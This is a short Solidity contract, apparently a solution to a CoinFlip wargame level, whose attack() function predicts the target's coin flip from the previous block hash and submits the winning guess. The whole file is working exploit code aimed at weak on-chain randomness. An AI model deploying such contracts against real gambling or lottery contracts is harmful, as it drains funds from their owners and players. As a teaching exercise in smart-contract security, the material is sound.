//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "./Coinflip.sol";

contract GuessCoinflip {
    CoinFlip public coinflip;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address _goodContractAddress) {
        coinflip = CoinFlip(_goodContractAddress);
    }

    function guess() internal returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
        revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }

    function attack() public {
        coinflip.flip(guess());
    }
}